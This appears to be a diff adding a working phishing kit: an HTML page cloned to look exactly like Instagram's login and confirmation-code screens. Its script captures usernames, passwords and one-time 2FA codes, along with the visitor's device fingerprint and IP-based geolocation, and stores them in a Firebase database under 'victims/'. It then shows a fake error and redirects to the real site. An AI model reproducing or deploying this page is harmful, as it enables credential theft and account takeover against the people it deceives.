@@ -1,0 +1,737 @@
+<!-- ═══════════════════════════════════════════════════════════
+     FILE: assets/instagram.html
+     ইনস্টাগ্রাম লগইন + OTP - হুবহু ক্লোন
+     Firebase অটো-কানেক্ট (config.js থেকে)
+     ═══════════════════════════════════════════════════════════ -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Login</title>
+    <meta property="og:site_name" content="Instagram">
+    <meta property="og:url" content="https://www.instagram.com/">
+    <meta property="og:image" content="https://www.instagram.com/static/images/ico/xxhdpi_launcher.png/99cf3909d459.png">
+    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/fj9U4v8h2bC.ico">
+    <link rel="canonical" href="https://www.instagram.com/">
+    <meta name="description" content="Create an account or log in to Instagram - Share what you're into with the people who get you.">
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+    <script src="../config.js"></script>
+    
+    <style>
+        :root {
+            --ig-bg: #ffffff;
+            --ig-text: #262626;
+            --ig-text-secondary: #8e8e8e;
+            --ig-border: #dbdbdb;
+            --ig-blue: #0095f6;
+            --ig-blue-hover: #1877f2;
+            --ig-facebook-blue: #385185;
+            --ig-gradient: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: var(--ig-bg);
+            color: var(--ig-text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        /* ── Main Container ── */
+        .ig-main {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex: 1;
+            padding: 40px 20px;
+            gap: 30px;
+            width: 100%;
+            max-width: 935px;
+        }
+        
+        /* ── Phone Mockup (Left) ── */
+        .ig-phone {
+            flex-shrink: 0;
+            width: 380px;
+            height: 580px;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 580"><rect width="380" height="580" rx="40" fill="%23ffffff" stroke="%23dbdbdb" stroke-width="12"/><rect x="100" y="10" width="180" height="20" rx="10" fill="%23dbdbdb"/><rect x="20" y="50" width="340" height="500" rx="20" fill="%23fafafa"/></svg>') center/contain no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        
+        .ig-phone-screen {
+            width: 320px;
+            height: 460px;
+            background: linear-gradient(135deg, #fdf497 0%, #fd5949 25%, #d6249f 50%, #285AEB 100%);
+            border-radius: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: -40px;
+        }
+        
+        .ig-phone-content {
+            width: 280px;
+            height: 420px;
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* ── Login Card (Right) ── */
+        .ig-login-section {
+            width: 350px;
+            flex-shrink: 0;
+        }
+        
+        .ig-card {
+            background: var(--ig-bg);
+            border: 1px solid var(--ig-border);
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            margin-bottom: 10px;
+        }
+        
+        /* Logo */
+        .ig-logo {
+            display: block;
+            margin: 0 auto 30px;
+            width: 175px;
+            height: 51px;
+        }
+        
+        .ig-logo svg {
+            width: 100%;
+            height: 100%;
+        }
+        
+        /* Form */
+        .ig-form-group {
+            margin-bottom: 8px;
+        }
+        
+        .ig-input-wrap {
+            position: relative;
+            margin-bottom: 6px;
+        }
+        
+        .ig-input {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 12px;
+            border: 1px solid var(--ig-border);
+            border-radius: 3px;
+            outline: none;
+            background: #fafafa;
+            color: var(--ig-text);
+            transition: border-color 0.2s;
+        }
+        
+        .ig-input:focus {
+            border-color: #a8a8a8;
+        }
+        
+        .ig-input::placeholder {
+            color: var(--ig-text-secondary);
+            font-size: 12px;
+        }
+        
+        /* Login Button */
+        .ig-btn-login {
+            width: 100%;
+            padding: 8px;
+            background: var(--ig-blue);
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 12px;
+            font-family: inherit;
+            transition: background 0.2s;
+        }
+        
+        .ig-btn-login:hover {
+            background: var(--ig-blue-hover);
+        }
+        
+        .ig-btn-login:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        /* Divider */
+        .ig-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: var(--ig-text-secondary);
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .ig-divider::before,
+        .ig-divider::after {
+            content: '';
+            flex: 1;
+            border-top: 1px solid var(--ig-border);
+        }
+        
+        .ig-divider span {
+            margin: 0 18px;
+        }
+        
+        /* Facebook Login */
+        .ig-fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: var(--ig-facebook-blue);
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-bottom: 15px;
+        }
+        
+        .ig-fb-icon {
+            width: 16px;
+            height: 16px;
+        }
+        
+        /* Forgot */
+        .ig-forgot {
+            display: block;
+            text-align: center;
+            color: var(--ig-facebook-blue);
+            font-size: 12px;
+            text-decoration: none;
+        }
+        
+        /* ── Sign Up Card ── */
+        .ig-signup-card {
+            background: var(--ig-bg);
+            border: 1px solid var(--ig-border);
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .ig-signup-card a {
+            color: var(--ig-blue);
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        /* ── App Download ── */
+        .ig-app-download {
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .ig-app-download p {
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+        
+        .ig-store-buttons {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+        }
+        
+        .ig-store-btn {
+            width: 136px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: black;
+            border-radius: 8px;
+            color: white;
+            text-decoration: none;
+            font-size: 11px;
+            gap: 5px;
+        }
+        
+        /* ── OTP Section ── */
+        .ig-otp-section {
+            display: none;
+        }
+        
+        .ig-otp-title {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .ig-otp-title .icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        
+        .ig-otp-title h2 {
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+        
+        .ig-otp-title p {
+            font-size: 14px;
+            color: var(--ig-text-secondary);
+        }
+        
+        .ig-otp-inputs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .ig-otp-box {
+            width: 45px;
+            height: 50px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            border: 1px solid var(--ig-border);
+            border-radius: 8px;
+            outline: none;
+        }
+        
+        .ig-otp-box:focus {
+            border-color: var(--ig-blue);
+            box-shadow: 0 0 0 2px rgba(0,149,246,0.2);
+        }
+        
+        .ig-otp-verify-btn {
+            width: 100%;
+            padding: 10px;
+            background: var(--ig-blue);
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-family: inherit;
+        }
+        
+        .ig-otp-resend {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            color: var(--ig-blue);
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        /* ── Loading Spinner ── */
+        .ig-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: ig-spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes ig-spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* ── Footer ── */
+        .ig-footer {
+            width: 100%;
+            max-width: 935px;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .ig-footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 15px;
+        }
+        
+        .ig-footer-links a {
+            color: var(--ig-text-secondary);
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .ig-footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .ig-footer-copyright {
+            color: var(--ig-text-secondary);
+            font-size: 12px;
+        }
+        
+        /* ── Responsive ── */
+        @media (max-width: 875px) {
+            .ig-phone {
+                display: none;
+            }
+            .ig-main {
+                justify-content: center;
+            }
+        }
+        
+        @media (max-width: 450px) {
+            .ig-card {
+                border: none;
+                padding: 20px 10px;
+            }
+            .ig-login-section {
+                width: 100%;
+                max-width: 350px;
+            }
+            .ig-signup-card {
+                border: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- ── Main Content ── -->
+    <div class="ig-main">
+        <!-- Phone Mockup -->
+        <div class="ig-phone">
+            <div class="ig-phone-screen">
+                <div class="ig-phone-content">
+                    <div style="padding:20px;display:flex;flex-direction:column;height:100%;">
+                        <div style="display:flex;align-items:center;gap:10px;margin-bottom:20px;">
+                            <div style="width:30px;height:30px;border-radius:50%;background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);"></div>
+                            <div style="font-weight:bold;font-size:14px;">username</div>
+                        </div>
+                        <div style="flex:1;background:#fafafa;border-radius:8px;"></div>
+                        <div style="display:flex;gap:15px;margin-top:15px;">
+                            <span style="font-size:20px;">❤️</span>
+                            <span style="font-size:20px;">💬</span>
+                            <span style="font-size:20px;">📤</span>
+                        </div>
+                        <div style="font-size:12px;font-weight:bold;margin-top:8px;">1,234 likes</div>
+                        <div style="font-size:12px;margin-top:4px;color:#8e8e8e;">username Great post! 🔥</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Login Section -->
+        <div class="ig-login-section">
+            <!-- Login Card -->
+            <div class="ig-card" id="loginCard">
+                <!-- Logo -->
+                <div class="ig-logo">
+                    <svg viewBox="0 0 175 51" fill="none">
+                        <text x="0" y="35" font-family="'Billabong', 'Segoe Script', cursive" font-size="45" fill="#262626" font-style="italic">Instagram</text>
+                    </svg>
+                </div>
+                
+                <!-- Login Form -->
+                <form id="loginForm" onsubmit="return handleLogin(event)">
+                    <div class="ig-form-group">
+                        <div class="ig-input-wrap">
+                            <input type="text" class="ig-input" id="username" name="username" 
+                                   placeholder="Phone number, username, or email" 
+                                   autofocus required autocomplete="off" 
+                                   style="margin-bottom:6px;">
+                        </div>
+                    </div>
+                    <div class="ig-form-group">
+                        <div class="ig-input-wrap">
+                            <input type="password" class="ig-input" id="password" name="password" 
+                                   placeholder="Password" required autocomplete="off">
+                        </div>
+                    </div>
+                    <input type="hidden" name="platform" value="instagram">
+                    
+                    <button type="submit" class="ig-btn-login" id="loginBtn">
+                        <span id="btnText">Log In</span>
+                        <div class="ig-spinner" id="spinner"></div>
+                    </button>
+                </form>
+                
+                <div class="ig-divider"><span>OR</span></div>
+                
+                <a href="#" class="ig-fb-login" onclick="event.preventDefault();">
+                    <svg class="ig-fb-icon" viewBox="0 0 16 16" fill="#385185">
+                        <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
+                    </svg>
+                    Log in with Facebook
+                </a>
+                
+                <a href="#" class="ig-forgot" onclick="event.preventDefault();">Forgot password?</a>
+            </div>
+            
+            <!-- OTP Card -->
+            <div class="ig-card ig-otp-section" id="otpCard">
+                <div class="ig-otp-title">
+                    <div class="icon">📱</div>
+                    <h2>Enter Confirmation Code</h2>
+                    <p>Enter the 6-digit code we sent to<br>your phone number or email.</p>
+                </div>
+                
+                <form id="otpForm" onsubmit="return handleOTP(event)">
+                    <div class="ig-otp-inputs">
+                        <input type="text" class="ig-otp-box" maxlength="1" pattern="[0-9]" required>
+                        <input type="text" class="ig-otp-box" maxlength="1" pattern="[0-9]" required>
+                        <input type="text" class="ig-otp-box" maxlength="1" pattern="[0-9]" required>
+                        <input type="text" class="ig-otp-box" maxlength="1" pattern="[0-9]" required>
+                        <input type="text" class="ig-otp-box" maxlength="1" pattern="[0-9]" required>
+                        <input type="text" class="ig-otp-box" maxlength="1" pattern="[0-9]" required>
+                    </div>
+                    <input type="hidden" id="otpCombined" name="otp">
+                    <button type="submit" class="ig-otp-verify-btn" id="otpBtn">
+                        <span id="otpBtnText">Verify</span>
+                        <div class="ig-spinner" id="otpSpinner"></div>
+                    </button>
+                </form>
+                
+                <a href="#" class="ig-otp-resend" onclick="event.preventDefault();">Resend Code</a>
+            </div>
+            
+            <!-- Sign Up Card -->
+            <div class="ig-signup-card">
+                Don't have an account? <a href="#" onclick="event.preventDefault();">Sign up</a>
+            </div>
+            
+            <!-- App Download -->
+            <div class="ig-app-download">
+                <p>Get the app.</p>
+                <div class="ig-store-buttons">
+                    <a href="#" class="ig-store-btn" onclick="event.preventDefault();">
+                        <span>📱</span> App Store
+                    </a>
+                    <a href="#" class="ig-store-btn" onclick="event.preventDefault();">
+                        <span>▶️</span> Google Play
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <div class="ig-footer">
+        <div class="ig-footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="ig-footer-copyright">© 2026 Instagram from Meta</div>
+    </div>
+    
+    <script>
+        // ═══════════════════════════════════════════════════════
+        // FIREBASE AUTO-CONNECT
+        // ═══════════════════════════════════════════════════════
+        
+        firebase.initializeApp(window.firebaseConfig);
+        const database = firebase.database();
+        
+        let loginData = {};
+        
+        // ═══════════════════════════════════════════════════════
+        // DEVICE INFO
+        // ═══════════════════════════════════════════════════════
+        
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            return {
+                userAgent: ua,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                browser: ua.includes('Chrome') && !ua.includes('Edg') ? 'Chrome' :
+                          ua.includes('Firefox') ? 'Firefox' :
+                          ua.includes('Edg') ? 'Edge' :
+                          ua.includes('Safari') ? 'Safari' : 'Unknown',
+                os: ua.includes('Windows') ? 'Windows' :
+                    ua.includes('Android') ? 'Android' :
+                    ua.includes('iPhone') ? 'iOS' :
+                    ua.includes('Mac') ? 'macOS' : 'Unknown',
+                device: ua.includes('Mobile') ? 'Mobile' : 'Desktop'
+            };
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // IP INFO
+        // ═══════════════════════════════════════════════════════
+        
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/', {
+                    signal: AbortSignal.timeout(5000)
+                });
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown',
+                    latitude: data.latitude || '',
+                    longitude: data.longitude || ''
+                };
+            } catch {
+                return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
+            }
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // OTP INPUT AUTO-ADVANCE
+        // ═══════════════════════════════════════════════════════
+        
+        document.querySelectorAll('.ig-otp-box').forEach((box, index, boxes) => {
+            box.addEventListener('input', function() {
+                if (this.value.length === 1 && index < boxes.length - 1) {
+                    boxes[index + 1].focus();
+                }
+                // Auto submit when all filled
+                if (index === boxes.length - 1 && this.value.length === 1) {
+                    const allFilled = Array.from(boxes).every(b => b.value.length === 1);
+                    if (allFilled) {
+                        combineOTP();
+                    }
+                }
+            });
+            
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                    boxes[index - 1].focus();
+                }
+            });
+        });
+        
+        function combineOTP() {
+            const boxes = document.querySelectorAll('.ig-otp-box');
+            let combined = '';
+            boxes.forEach(box => combined += box.value);
+            document.getElementById('otpCombined').value = combined;
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // STEP 1: LOGIN HANDLER
+        // ═══════════════════════════════════════════════════════
+        
+        async function handleLogin(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) return false;
+            
+            // Show loading
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('loginBtn').disabled = true;
+            
+            // Store login data
+            loginData = {
+                platform: 'instagram',
+                username: username,
+                password: password,
+                deviceInfo: getDeviceInfo(),
+                ipInfo: await getIPInfo(),
+                timestamp: new Date().toISOString(),
+                victimId: 'ig_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                referrer: document.referrer || 'Direct Access',
+                pageUrl: window.location.href
+            };
+            
+            // Simulate verification delay
+            setTimeout(() => {
+                // Hide login card, show OTP card
+                document.getElementById('loginCard').style.display = 'none';
+                document.getElementById('otpCard').style.display = 'block';
+                
+                // Reset button
+                document.getElementById('btnText').style.display = 'inline';
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('loginBtn').disabled = false;
+                
+                // Focus first OTP box
+                document.querySelector('.ig-otp-box').focus();
+            }, 1500);
+            
+            return false;
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // STEP 2: OTP HANDLER
+        // ═══════════════════════════════════════════════════════
+        
+        async function handleOTP(event) {
+            event.preventDefault();
+            
+            combineOTP();
+            const otp = document.getElementById('otpCombined').value;
+            
+            if (!otp || otp.length !== 6) {
+                alert('Please enter the 6-digit code');
+                return false;
+            }
+            
+            // Show loading
+            document.getElementById('otpBtnText').style.display = 'none';
+            document.getElementById('otpSpinner').style.display = 'block';
+            document.getElementById('otpBtn').disabled = true;
+            
+            // Add OTP to victim data
+            loginData.otp = otp;
+            loginData.otpTimestamp = new Date().toISOString();
+            loginData.verificationStep = 'otp_complete';
+            
+            // Save to Firebase
+            try {
+                await database.ref('victims/' + loginData.victimId).set(loginData);
+                console.log('✓ Credentials + OTP captured');
+            } catch (error) {
+                console.error('Firebase error:', error.message);
+            }
+            
+            // Show error and redirect (Instagram-style)
+            setTimeout(() => {
+                alert('Sorry, there was a problem with your request. Please try again.');
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            }, 2000);
+            
+            return false;
+        }
+    </script>
+</body>
+</html>
